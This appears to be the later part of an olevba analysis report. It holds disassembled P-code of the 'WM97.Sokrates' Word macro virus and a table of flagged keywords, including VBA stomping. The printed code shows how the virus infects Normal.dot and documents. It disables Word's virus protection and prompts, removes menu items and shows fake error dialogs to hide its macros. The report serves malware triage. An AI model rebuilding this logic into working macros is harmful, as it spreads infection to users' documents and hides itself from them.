' 	Concat 
' 	LitStr 0x0006 ".Count"
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #79:
' 	LitDI2 0x0019 
' 	Ld v7$ 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	Ld v5$ 
' 	Concat 
' 	LitStr 0x0020 ".Item(i).CodeModule.CountOfLines"
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #80:
' 	LitDI2 0x001A 
' 	LitStr 0x0003 "If "
' 	Ld v7$ 
' 	Concat 
' 	LitStr 0x000C " = 162 Then "
' 	Concat 
' 	Ld v8$ 
' 	Concat 
' 	LitStr 0x0004 " = 1"
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #81:
' 	LitDI2 0x001D 
' 	LitStr 0x000D "For i = 1 To "
' 	Ld v6$ 
' 	Concat 
' 	LitStr 0x0006 ".Count"
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #82:
' 	LitDI2 0x001E 
' 	Ld v7$ 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	Ld v6$ 
' 	Concat 
' 	LitStr 0x0020 ".Item(i).CodeModule.CountOfLines"
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #83:
' 	LitDI2 0x001F 
' 	LitStr 0x0003 "If "
' 	Ld v7$ 
' 	Concat 
' 	LitStr 0x000C " = 162 Then "
' 	Concat 
' 	Ld v9$ 
' 	Concat 
' 	LitStr 0x0004 " = 1"
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #84:
' 	LitDI2 0x0022 
' 	LitStr 0x0003 "If "
' 	Ld v8$ 
' 	Concat 
' 	LitStr 0x0008 " = 0 Or "
' 	Concat 
' 	Ld v9$ 
' 	Concat 
' 	LitStr 0x0037 " = 0 Then Application.VBE.ActiveVBProject.VBComponents("
' 	Concat 
' 	Ld v3$ 
' 	Concat 
' 	LitStr 0x0009 ").Export "
' 	Concat 
' 	Ld v4$ 
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #85:
' 	LitDI2 0x0024 
' 	LitStr 0x0003 "If "
' 	Ld v9$ 
' 	Concat 
' 	LitStr 0x0009 " = 0 Then"
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #86:
' 	LitDI2 0x0025 
' 	Ld v6$ 
' 	LitStr 0x0008 ".Import "
' 	Concat 
' 	Ld v4$ 
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #87:
' 	LitDI2 0x0026 
' 	LitStr 0x0043 "Application.OrganizerRename Source:=NormalTemplate.FullName, Name:="
' 	Ld v3$ 
' 	Concat 
' 	LitStr 0x000B ", Newname:="
' 	Concat 
' 	Ld v2$ 
' 	Concat 
' 	LitStr 0x0027 ", Object:=wdOrganizerObjectProjectItems"
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #88:
' 	LitDI2 0x0027 
' 	LitStr 0x0005 "With "
' 	Ld v6$ 
' 	Concat 
' 	LitStr 0x0006 ".Item("
' 	Concat 
' 	Ld v2$ 
' 	Concat 
' 	LitStr 0x000C ").CodeModule"
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #89:
' 	LitDI2 0x0044 
' 	LitStr 0x0003 "If "
' 	Ld v8$ 
' 	Concat 
' 	LitStr 0x0009 " = 0 Then"
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #90:
' 	LitDI2 0x0045 
' 	Ld v5$ 
' 	LitStr 0x0008 ".Import "
' 	Concat 
' 	Ld v4$ 
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #91:
' 	LitDI2 0x0046 
' 	LitStr 0x0043 "Application.OrganizerRename Source:=ActiveDocument.FullName, Name:="
' 	Ld v3$ 
' 	Concat 
' 	LitStr 0x000B ", Newname:="
' 	Concat 
' 	Ld v2$ 
' 	Concat 
' 	LitStr 0x0027 ", Object:=wdOrganizerObjectProjectItems"
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #92:
' 	LitDI2 0x0047 
' 	LitStr 0x0005 "With "
' 	Ld v5$ 
' 	Concat 
' 	LitStr 0x0006 ".Item("
' 	Concat 
' 	Ld v2$ 
' 	Concat 
' 	LitStr 0x000C ").CodeModule"
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #93:
' 	LitDI2 0x0066 
' 	LitStr 0x000E "Sub AutoOpen()"
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #94:
' 	LitDI2 0x006A 
' 	LitStr 0x0005 "Call "
' 	Ld v10$ 
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #95:
' 	EndWith 
' Line #96:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #97:
' 	EndIfBlock 
' Line #98:
' Line #99:
' 	EndSub 
' Line #100:
' Line #101:
' 	FuncDefn (Sub AutoOpen())
' Line #102:
' 	OnError (Resume Next) 
' Line #103:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' 	BoS 0x0000 
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #104:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #105:
' 	ArgsCall (Call) uf9196 0x0000 
' Line #106:
' 	LitStr 0x0010 "Formatvorlage..."
' 	LitStr 0x0006 "Format"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #107:
' 	LitStr 0x0017 "Vorlagen und Add-Ins..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #108:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Hour 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0018 
' 	Mul 
' 	FnInt 
' 	Eq 
' 	IfBlock 
' Line #109:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #110:
' 	Ld msoIconAlert 
' 	MemStWith Icon 
' Line #111:
' 	LitStr 0x0015 "-=[ WM97.Sokrates ]=-"
' 	MemStWith Heading 
' Line #112:
' 	LitStr 0x0018 "Greetz to Sokrates<LzØ>!"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000E "Jack Twoflower"
' 	Concat 
' 	MemStWith Then 
' Line #113:
' 	Ld msoAnimationCheckingSomething 
' 	MemStWith Animation 
' Line #114:
' 	ArgsMemCallWith Show 0x0000 
' Line #115:
' 	EndWith 
' Line #116:
' 	EndIfBlock 
' Line #117:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' 	BoS 0x0000 
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #118:
' 	EndSub 
' Line #119:
' Line #120:
' 	FuncDefn (Sub ExtrasMakro())
' Line #121:
' 	Dim 
' 	VarDefn x
' Line #122:
' 	OptionBase 
' 	LitDI2 0x0000 
' 	Redim Combobox1__$ 0x0001 (As String)
' Line #123:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0000 
' 	ArgsSt Combobox1__$ 0x0001 
' Line #124:
' 	OptionBase 
' 	LitDI2 0x0000 
' 	Redim Textbox1__$ 0x0001 (As String)
' Line #125:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0000 
' 	ArgsSt Textbox1__$ 0x0001 
' Line #126:
' 	OptionBase 
' 	LitDI2 0x0000 
' 	Redim DropListBox2__$ 0x0001 (As String)
' Line #127:
' 	LitStr 0x0024 "Normal.dot (Globale Dokumentvorlage)"
' 	LitDI2 0x0000 
' 	ArgsSt DropListBox2__$ 0x0001 
' Line #128:
' Line #129:
' 	LitDI2 0x026C 
' 	LitDI2 0x0118 
' 	LitStr 0x0006 "Makros"
' 	Ld WordBasic 
' 	ArgsMemCall BeginDialog 0x0003 
' Line #130:
' 	LitDI2 0x0007 
' 	LitDI2 0x0006 
' 	LitDI2 0x005D 
' 	LitDI2 0x000D 
' 	LitStr 0x000B "Makro&name:"
' 	LitStr 0x0005 "Text3"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #131:
' 	LitDI2 0x0007 
' 	LitDI2 0x0017 
' 	LitDI2 0x01B3 
' 	LitDI2 0x00AA 
' 	ArgsLd Combobox1__$ 0x0000 
' 	LitStr 0x0009 "Combobox1"
' 	Ld WordBasic 
' 	ArgsMemCall ComboBox 0x0006 
' Line #132:
' 	LitDI2 0x01D6 
' 	LitDI2 0x000E 
' 	LitDI2 0x0089 
' 	LitDI2 0x0015 
' 	LitStr 0x000A "&Ausführen"
' 	LitStr 0x000C "Definierbar2"
' 	Ld WordBasic 
' 	ArgsMemCall PushButton 0x0006 
' Line #133:
' 	LitDI2 0x01D6 
' 	LitDI2 0x0026 
' 	LitDI2 0x0089 
' 	LitDI2 0x0015 
' 	Ld WordBasic 
' 	ArgsMemCall CancelButton 0x0004 
' Line #134:
' 	LitDI2 0x01D6 
' 	LitDI2 0x0048 
' 	LitDI2 0x0089 
' 	LitDI2 0x0015 
' 	LitStr 0x0014 "&Schrittweise prüfen"
' 	LitStr 0x000C "Definierbar3"
' 	Ld WordBasic 
' 	ArgsMemCall PushButton 0x0006 
' Line #135:
' 	LitDI2 0x01D6 
' 	LitDI2 0x0060 
' 	LitDI2 0x0089 
' 	LitDI2 0x0015 
' 	LitStr 0x000B "&Bearbeiten"
' 	LitStr 0x000C "Definierbar4"
' 	Ld WordBasic 
' 	ArgsMemCall PushButton 0x0006 
' Line #136:
' 	LitDI2 0x01D6 
' 	LitDI2 0x0082 
' 	LitDI2 0x0089 
' 	LitDI2 0x0015 
' 	LitStr 0x000A "&Erstellen"
' 	LitStr 0x000C "Definierbar5"
' 	Ld WordBasic 
' 	ArgsMemCall PushButton 0x0006 
' Line #137:
' 	LitDI2 0x01D6 
' 	LitDI2 0x009A 
' 	LitDI2 0x0089 
' 	LitDI2 0x0015 
' 	LitStr 0x000D "&Organisieren"
' 	LitStr 0x000C "Definierbar6"
' 	Ld WordBasic 
' 	ArgsMemCall PushButton 0x0006 
' Line #138:
' 	LitDI2 0x01D6 
' 	LitDI2 0x00B2 
' 	LitDI2 0x0089 
' 	LitDI2 0x0015 
' 	LitStr 0x0010 "&Organisieren..."
' 	LitStr 0x000C "Definierbar7"
' 	Ld WordBasic 
' 	ArgsMemCall PushButton 0x0006 
' Line #139:
' 	LitDI2 0x0007 
' 	LitDI2 0x00C8 
' 	LitDI2 0x005D 
' 	LitDI2 0x000D 
' 	LitStr 0x000B "Ma&kros in:"
' 	LitStr 0x0005 "Text1"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #140:
' 	LitDI2 0x005A 
' 	LitDI2 0x00C4 
' 	LitDI2 0x0162 
' 	LitDI2 0x0013 
' 	ArgsLd DropListBox2__$ 0x0000 
' 	LitStr 0x0008 "Listbox2"
' 	Ld WordBasic 
' 	ArgsMemCall DropListBox 0x0006 
' Line #141:
' 	LitDI2 0x0007 
' 	LitDI2 0x00DE 
' 	LitDI2 0x006D 
' 	LitDI2 0x000D 
' 	LitStr 0x000D "Beschreibung:"
' 	LitStr 0x0005 "Text2"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #142:
' 	LitDI2 0x0007 
' 	LitDI2 0x00EB 
' 	LitDI2 0x01B5 
' 	LitDI2 0x0026 
' 	ArgsLd Textbox1__$ 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall TextBox 0x0005 
' Line #143:
' 	Ld WordBasic 
' 	ArgsMemCall EndDialog 0x0000 
' Line #144:
' Line #145:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	MemLd UserDialog 
' 	Set dlg 
' Line #146:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemLd UserDialog 0x0001 
' 	St x 
' Line #147:
' 	Ld x 
' 	SelectCase 
' Line #148:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' Line #149:
' 	Ld WordBasic 
' 	ArgsMemCall Cancel 0x0000 
' Line #150:
' 	LitDI2 0x0001 
' 	LitDI2 0x0006 
' 	CaseTo 
' 	CaseDone 
' Line #151:
' 	LitStr 0x0049 "Nicht genug Arbeitsspeicher! Schließen Sie eine oder mehrere Anwendungen!"
' 	LitStr 0x0012 "WordBasic Fehler=7"
' 	LitDI2 0x0030 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0003 
' Line #152:
' 	EndSelect 
' Line #153:
' 	EndSub 
' Line #154:
' 	FuncDefn (Sub AnsichtCode())
' Line #155:
' 	Ld Application 
' 	MemLd StartupPath 
' 	ArgsLd UCase 0x0001 
' 	St apppath 
' Line #156:
' 	LitStr 0x0034 "Die erforderliche Datei 'Vba32.dll' im Verzeichnis ""
' 	Ld apppath 
' 	Concat 
' 	LitStr 0x0050 "" wurde nicht gefunden. Versuchen Sie die fehlende Datei erneut zu installieren!"
' 	Concat 
' 	LitDI2 0x0010 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #157:
' 	EndSub 
' Line #158:
' 	FuncDefn (Sub AnsichtVBCode())
' Line #159:
' 	Ld Application 
' 	MemLd StartupPath 
' 	ArgsLd UCase 0x0001 
' 	St apppath 
' Line #160:
' 	LitStr 0x0034 "Die erforderliche Datei 'Vba32.dll' im Verzeichnis ""
' 	Ld apppath 
' 	Concat 
' 	LitStr 0x0050 "" wurde nicht gefunden. Versuchen Sie die fehlende Datei erneut zu installieren!"
' 	Concat 
' 	LitDI2 0x0010 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #161:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |Vba32.dll           |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

